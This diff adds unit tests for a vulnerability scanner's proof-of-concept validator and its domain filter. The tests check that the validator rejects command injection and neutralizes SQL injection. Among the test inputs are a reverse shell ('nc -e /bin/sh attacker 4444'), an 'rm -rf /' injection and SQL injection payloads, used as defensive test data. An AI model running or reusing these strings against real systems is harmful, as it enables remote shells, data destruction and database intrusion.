@@ -636,6 +636,113 @@ Parameter: q (GET)
             shutil.rmtree(tmpdir)
 
 
+class TestPocValidator(unittest.TestCase):
+    """Lógica de confirmação/confiança — a parte mais sensível a falsos positivos."""
+
+    def test_clamp_single_definition(self):
+        import poc_validator as pv
+        # Deve haver exatamente uma definição ativa, aceitando 3 args e retornando 3-tupla
+        confirmed, conf, note = pv._clamp_confidence(True, 90, "ok")
+        self.assertEqual((confirmed, conf, note), (True, 90, "ok"))
+
+    def test_clamp_downgrades_low_confidence(self):
+        import poc_validator as pv
+        confirmed, conf, _ = pv._clamp_confidence(True, 50, "")
+        self.assertFalse(confirmed, "Confiança < MIN_CONFIRM_CONFIDENCE não pode ficar confirmada")
+
+    def test_clamp_caps_at_99(self):
+        import poc_validator as pv
+        _, conf, _ = pv._clamp_confidence(True, 150, "")
+        self.assertEqual(conf, 99)
+
+    def test_sanitize_nuclei_curl_rejects_injection(self):
+        import poc_validator as pv
+        self.assertIsNone(pv._sanitize_nuclei_curl("curl 'http://x'; rm -rf /"))
+        self.assertIsNone(pv._sanitize_nuclei_curl("curl $(whoami)"))
+        self.assertIsNone(pv._sanitize_nuclei_curl("curl `id`"))
+        self.assertIsNone(pv._sanitize_nuclei_curl("nc -e /bin/sh attacker 4444"))
+
+    def test_sanitize_nuclei_curl_accepts_benign(self):
+        import poc_validator as pv
+        cmd = "curl -sk 'https://target.com/?id=1&q=2'"
+        self.assertEqual(pv._sanitize_nuclei_curl(cmd), cmd)
+
+    def test_build_safe_baseline_neutralizes_single_quote_sqli(self):
+        import poc_validator as pv
+        clean, safe = pv.build_safe_baseline("curl 'http://x/?id=1 OR 1=1'", "http://x")
+        self.assertNotIn("OR 1=1", safe)
+
+    def test_build_safe_baseline_neutralizes_double_quote_sqli(self):
+        import poc_validator as pv
+        # Antes só aspas simples eram tratadas → payload em aspas duplas era FN
+        clean, safe = pv.build_safe_baseline('curl "http://x/?id=1 UNION SELECT 1"', "http://x")
+        self.assertNotIn("UNION SELECT", safe)
+
+    def test_response_diff_ignores_small_change(self):
+        import poc_validator as pv
+        base = "a" * 1000
+        payload = "a" * 1010  # 1% — abaixo do threshold
+        changed, conf, _ = pv.response_diff(pv.normalize(base), pv.normalize(payload))
+        self.assertFalse(changed)
+
+    def test_response_diff_flags_new_error_message(self):
+        import poc_validator as pv
+        base = "welcome home " * 20
+        payload = base + " you have an SQL error in your syntax"
+        changed, conf, _ = pv.response_diff(pv.normalize(base), pv.normalize(payload))
+        self.assertTrue(changed)
+        self.assertGreaterEqual(conf, 20, "Mensagem de erro nova é sinal forte")
+
+    def test_sqli_size_only_diff_not_confirmed_without_doublecheck(self):
+        import poc_validator as pv
+        # diff só por tamanho (diff_conf=15), sem double-check → NÃO confirma (anti-FP)
+        confirmed, conf, _ = pv.validate(
+            "sqli", "http://x/?id=1", "resposta dinâmica", "", "200",
+            diff_changed=True, diff_conf=15, diff_note="mudou 40%", dc_result=None)
+        self.assertFalse(confirmed)
+
+    def test_sqli_size_only_diff_confirmed_with_doublecheck(self):
+        import poc_validator as pv
+        confirmed, conf, _ = pv.validate(
+            "sqli", "http://x/?id=1", "resposta", "", "200",
+            diff_changed=True, diff_conf=15, diff_note="mudou 40%",
+            dc_result=(True, "consistente"))
+        self.assertTrue(confirmed)
+        self.assertGreaterEqual(conf, 60)
+
+
+class TestDomainFilter(unittest.TestCase):
+    """Fix do _strip_www: lstrip removia caracteres soltos, quebrando o filtro."""
+
+    def setUp(self):
+        self.tmpdir = tempfile.mkdtemp()
+
+    def tearDown(self):
+        shutil.rmtree(self.tmpdir)
+
+    def _run(self, urls, target):
+        with open(os.path.join(self.tmpdir, "input_nuclei.jsonl"), "w") as f:
+            for u in urls:
+                f.write(json.dumps({"matched-at": u, "info": {"name": "x", "severity": "info"}}) + "\n")
+        extract_all_urls(self.tmpdir, target)
+        return open(os.path.join(self.tmpdir, "all_target_urls.txt")).read()
+
+    def test_www_prefix_stripped_not_chars(self):
+        # web.com NÃO deve virar eb.com (bug do lstrip). URL de web.com deve passar.
+        content = self._run(["http://web.com/?id=1"], "web.com")
+        self.assertIn("http://web.com/?id=1", content,
+                      "URL do próprio domínio não pode ser descartada pelo bug do lstrip")
+
+    def test_external_domain_excluded(self):
+        content = self._run(["http://evil.com/?id=1"], "web.com")
+        self.assertNotIn("evil.com", content)
+
+    def test_www_target_matches_apex(self):
+        # alvo www.example.com deve aceitar URL do apex example.com
+        content = self._run(["http://example.com/?id=1"], "www.example.com")
+        self.assertIn("http://example.com/?id=1", content)
+
+
 if __name__ == "__main__":
     # Run with verbose output
     unittest.main(verbosity=2)
